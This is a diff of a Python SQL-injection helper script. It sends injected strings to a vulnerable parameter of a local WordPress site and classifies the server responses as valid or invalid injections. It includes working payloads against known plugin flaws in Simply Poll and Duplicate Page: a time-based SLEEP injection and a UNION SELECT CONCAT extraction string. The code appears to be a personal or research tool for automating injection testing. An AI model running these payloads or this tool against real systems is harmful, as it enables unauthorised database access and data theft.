@@ -3,130 +3,80 @@ import requests
 import copy
 import time
 
-The_target = None 
-
 ## Model
-def get_default_average_time(target, nb):
-    """get average time for wrong requests"""
-    som = 0
-    for i in range(nb):        
-        start = time.clock()
-        post_request(target, chr((10000+i)%55295)+chr((20000+i)%55295))
-        stop = time.clock()
-        som += (stop - start)
-    return som/nb
 
-def post_request(target, injtxt): 
+def http_request(target, injtxt): 
     """send a post request to the target with a supplement to the vulnerable param and return server response"""
     injected_target = copy.deepcopy(target)
-    injected_target.payload[target.param] = target.payload[target.param] + injtxt
-    r = requests.post(injected_target.url, data=injected_target.payload)    
+    injected_target.payload[target.vulnparam] = target.payload[target.vulnparam] + injtxt
+    if target.method == "GET":
+        #r = requests.get(injected_target.url+"?"+data=injected_target.payload)
+        ## TO DO
+        pass
+    elif target.method == "POST":
+        r = requests.post(injected_target.url, data=injected_target.payload)    
     return r   
 
-def get_request(target, injtxt): 
-    """send a get request to the target with a supplement to the vulnerable param and return server response"""
-    ## TO DO 
-    pass 
 
 class HttpTarget:
-    """describe a target with an url, a default payload and the vulnerable param"""
-    def __init__(self, url, payload, param, nb=10):
-        self.url = url
-        self.payload = payload        
-        self.param = param
-        self.defaultPage = post_request(self, '').text
-        self.avgTime = get_default_average_time(self, nb)
-    def update_avgTime(self, nb=5):
-        self.avgTime = get_default_average_time(self, nb)
+    """describe a target with an url, method GET/POST, default payload and the vulnerable param."""
+    def __init__(self, url, method, payload, param):
+        self.url = url                                      # string
+        self.method = method                                # GET or POST
+        self.payload = payload                              # dict
+        self.vulnparam = param                              # string
+        self.defaultPage = http_request(self, '').text
 
-
-## Main functions
-def init(url, payload, param, nb=10):
-    """define the target"""
-    global The_target 
-    The_target = HttpTarget(url, payload, param, nb)
-    print(" >>> target locked at :", The_target.url) 
-    print(" >>>        measured average response time :", round(The_target.avgTime,2),"s")
-
-
-def oracle(injtxt):
+       
+## Main function    
+def oracle(url, method, payload, param, injtxt):
     """return 0 only if injtxt is syntactically valid"""
-    if The_target == None:
-        print(" >>> the target is sadly not defined (。_。)")
-        print(" >>> try: python sqloracl.py init ([url](string), [payload](dict), [param](string), optional [avgnb](int))") 
-    else:        
-        start = time.clock()
-        r = post_request(The_target, injtxt)
-        stop = time.clock()            
-        #print(r.text)
-        delay = (stop - start)     
-        if r.text.find("error")>= 0:    
-            print(" >>> target raised error ┗( T﹏T )┛")
-            return 1 # invalid
-        elif r.text != The_target.defaultPage:
-            print(" >>> target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
-            return 0 # valid        
-        elif delay>The_target.avgTime*3:
-            The_target.update_avgTime(3) #update avg response time
-            if delay>The_target.avgTime*3:   
-                print(" >>> target was very slow to answer (✿◡‿◡)")         
-                return 0 # valid
-        else:
-            print(" >>> oracle was not able to determine if \""+injtxt+"\" was undoubtedly invalid ¯\(°_o)/¯") 
-            return 0 # default
+
+    target = HttpTarget(url, method, payload, param)
+    r = http_request(target, injtxt)         
+   
+    if r.text.find("error")>= 0:    
+        print("[oracleSQL] target raised error ┗( T﹏T )┛")
+        return 1 # invalid
+    elif r.text != target.defaultPage: # l'injection est sûre (facultatif
+        print("[oracleSQL] target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
+        return 0 # valid        
+    else:
+        print("[oracleSQL] not able to determine if \""+injtxt+"\" was undoubtedly invalid ¯\(°_o)/¯") 
+        return 0 # default
     
  
 ## Tests
 # Targets
 #https://www.exploit-db.com/exploits/40971
 simply_poll = HttpTarget("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
-                         {'action': 'spAjaxResults', 'pollid': '2'},
+                         "POST",
+                         {'action':'spAjaxResults','pollid':'2'},
                          "pollid")
 #https://wpvulndb.com/vulnerabilities/9251
+duplicate_page = HttpTarget("http://localhost/injections/wordp/wp-admin/wp-admin/admin.php?",
+                         "GET",
+                         {'action':'dt_duplicate_post_as_draft','post':''},
+                         "post")
 
-
-## post_request 
-#print(post_request(simply_poll, "").text)
+## http_request 
+print(http_request(simply_poll, "").text)
 ## wrong post
-#print(post_request(simply_poll, "toto").text)
+print(http_request(simply_poll, "toto").text)
 ## ## injection SQL (sleep 5s)
-#print(post_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
+print(http_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
 ## ## injection SQL (CONCAT)
-#print(post_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)
+print(http_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)
 
-# get_default_average_time
-#print(get_default_average_time(simply_poll, 10))
 
-print("oracle toto")
-oracle("toto")
+## oracle
+print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,""))
+## wrong post
+print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,"toto"))
+## ## injection SQL (sleep 5s)
+print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam," AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"))
+## ## injection SQL (CONCAT)
+print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--'))
 
-print()
-print("init http://localhost/injections/wordp/wp-admin/admin-ajax.php {'action':'spAjaxResults','pollid':'2'} pollid")
-init("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
-     {'action': 'spAjaxResults', 'pollid': '2'},
-     "pollid")
 
-print(type(The_target))
-
-print()
-print("[test] ↓ invalid: return 1")
-
-print("oracle toto")
-print(" >>> return", oracle("toto"))
-print("oracle "+chr(156))
-print(" >>> return", oracle(chr(156)))
-print("oracle AND SLEEP(5)")
-print(" >>> return", oracle(" AND SLEEP(5)"))
-
-print()
-print("[test] ↓ valid: return 0")
-
-print("oracle")
-print(" >>> return", oracle(""))
-print("oracle \" AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)\"")
-print(" >>> return", oracle(" AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"))
-print("oracle \"UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--\"")
-print(" >>> return", oracle(" UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--"))
-print("oracle \" UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71,0x51,0x71),6050--\"")
-print(" >>> return", oracle(" UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71,0x51,0x71),6050--"))
 
